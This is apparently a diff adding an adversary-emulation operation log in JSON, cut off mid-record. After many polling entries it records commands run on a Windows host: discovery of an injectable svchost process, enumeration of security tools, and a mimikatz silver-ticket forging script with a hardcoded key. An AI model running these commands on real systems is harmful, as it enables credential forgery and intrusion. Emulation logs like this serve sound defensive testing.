+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:44Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:48Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:52Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:56Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:00Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:05Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:09Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:13Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:17Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:21Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:25Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:30Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:34Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:38Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:42Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:46Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:50Z",
+      "state": "running",
+      "links": 8,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:54Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:51:59Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:03Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:07Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:11Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:15Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:19Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:23Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:27Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:31Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:36Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:40Z",
+      "state": "cleanup",
+      "links": 9,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:43Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:45Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:48Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:51Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:54Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:56Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:52:59Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:02Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:04Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:07Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:10Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:13Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:15Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:18Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:21Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:23Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:26Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:29Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:32Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:34Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:37Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:40Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:42Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:45Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:48Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:51Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:53Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:56Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:53:59Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:01Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:04Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:07Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:10Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:12Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:15Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:18Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:20Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:23Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:26Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:29Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:31Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:34Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:37Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:39Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:42Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:45Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:48Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:50Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:53Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:56Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:54:58Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:01Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:04Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:07Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:09Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:12Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:15Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:17Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:20Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:23Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:55:25Z",
+      "state": "finished",
+      "links": 9,
+      "potential_links": 0,
+      "event_logs": 0
+    }
+  ],
+  "last_poll_utc": "2026-04-01T13:55:25Z",
+  "links": [
+    {
+      "id": "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6",
+      "paw": "fgdafj",
+      "command": "$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };$valid | ConvertTo-Json",
+      "plaintext_command": "$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };$valid | ConvertTo-Json",
+      "status": 0,
+      "score": 0,
+      "decide": "2026-04-01T13:45:26Z",
+      "pin": 0,
+      "pid": "2388",
+      "facts": [
+        {
+          "unique": "host.process.id1036",
+          "trait": "host.process.id",
+          "name": "host.process.id",
+          "value": 1036,
+          "created": "2026-04-01T13:45:40Z",
+          "score": 1,
+          "source": "ca25eccc-1615-463f-92e7-c885e9915d59",
+          "origin_type": "LEARNED",
+          "links": [
+            "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6"
+          ],
+          "relationships": [
+            "host.process.id(1036)"
+          ],
+          "limit_count": -1,
+          "collected_by": [
+            "fgdafj"
+          ],
+          "technique_id": "T1057"
+        },
+        {
+          "unique": "host.process.id1836",
+          "trait": "host.process.id",
+          "name": "host.process.id",
+          "value": 1836,
+          "created": "2026-04-01T13:45:40Z",
+          "score": 1,
+          "source": "ca25eccc-1615-463f-92e7-c885e9915d59",
+          "origin_type": "LEARNED",
+          "links": [
+            "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6"
+          ],
+          "relationships": [
+            "host.process.id(1836)"
+          ],
+          "limit_count": -1,
+          "collected_by": [
+            "fgdafj"
+          ],
+          "technique_id": "T1057"
+        },
+        {
+          "unique": "host.process.id6328",
+          "trait": "host.process.id",
+          "name": "host.process.id",
+          "value": 6328,
+          "created": "2026-04-01T13:45:40Z",
+          "score": 1,
+          "source": "ca25eccc-1615-463f-92e7-c885e9915d59",
+          "origin_type": "LEARNED",
+          "links": [
+            "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6"
+          ],
+          "relationships": [
+            "host.process.id(6328)"
+          ],
+          "limit_count": -1,
+          "collected_by": [
+            "fgdafj"
+          ],
+          "technique_id": "T1057"
+        }
+      ],
+      "relationships": [],
+      "used": [],
+      "unique": "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6",
+      "collect": "2026-04-01T13:45:37Z",
+      "finish": "2026-04-01T13:45:40Z",
+      "ability": {
+        "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7",
+        "tactic": "discovery",
+        "technique_name": "Process Discovery",
+        "technique_id": "T1057",
+        "name": "Discover injectable process",
+        "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [
+              {
+                "module": "plugins.stockpile.app.parsers.json",
+                "parserconfigs": [
+                  {
+                    "source": "host.process.id",
+                    "edge": "",
+                    "target": "",
+                    "custom_parser_vals": {
+                      "json_key": "Id",
+                      "json_type": "int"
+                    }
+                  }
+                ]
+              }
+            ],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "discovery"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "stockpile",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [
+          {
+            "module": "plugins.stockpile.app.parsers.json",
+            "parserconfigs": [
+              {
+                "source": "host.process.id",
+                "edge": "",
+                "target": "",
+                "custom_parser_vals": {
+                  "json_key": "Id",
+                  "json_type": "int"
+                }
+              }
+            ]
+          }
+        ],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-01T13:45:38Z"
+    },
+    {
+      "id": "c0247be8-17a5-428a-a42c-08ed6bb23967",
+      "paw": "fgdafj",
+      "command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\"",
+      "plaintext_command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\"",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-01T13:45:42Z",
+      "pin": 0,
+      "pid": "3000",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "c0247be8-17a5-428a-a42c-08ed6bb23967",
+      "collect": "2026-04-01T13:46:34Z",
+      "finish": "2026-04-01T13:46:42Z",
+      "ability": {
+        "ability_id": "44beec43a3cfb4e7bb1b976e64a09da9",
+        "tactic": "discovery",
+        "technique_name": "Software Discovery: Security Software Discovery",
+        "technique_id": "T1518.001",
+        "name": "Security Software Discovery",
+        "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n",
+        "executors": [
+          {
+            "name": "cmd",
+            "platform": "windows",
+            "command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\"",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "discovery"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "atomic",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "cmd",
+        "platform": "windows",
+        "command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\"",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-01T13:46:35Z"
+    },
+    {
+      "id": "5a721850-4e1e-426c-847c-d896af2018a3",
+      "paw": "fgdafj",
+      "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
+      "plaintext_command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-01T13:46:47Z",
+      "pin": 0,
+      "pid": "8236",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "5a721850-4e1e-426c-847c-d896af2018a3",
+      "collect": "2026-04-01T13:47:23Z",
+      "finish": "2026-04-01T13:47:24Z",
+      "ability": {
+        "ability_id": "8bdb353bbee5378745783ff6f2d49cb0",
+        "tactic": "credential-access",
+        "technique_name": "Steal or Forge Kerberos Tickets: Silver Ticket",
+        "technique_id": "T1558.002",
+        "name": "Crafting Active Directory silver tickets with mimikatz",
+        "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [
+              {
+                "module": "plugins.atomic.app.parsers.atomic_powershell",
+                "parserconfigs": [
+                  {
+                    "source": "validate_me",
+                    "edge": "",
+                    "target": "",
+                    "custom_parser_vals": {}
+                  }
+                ]
+              }
+            ],
+            "cleanup": [],
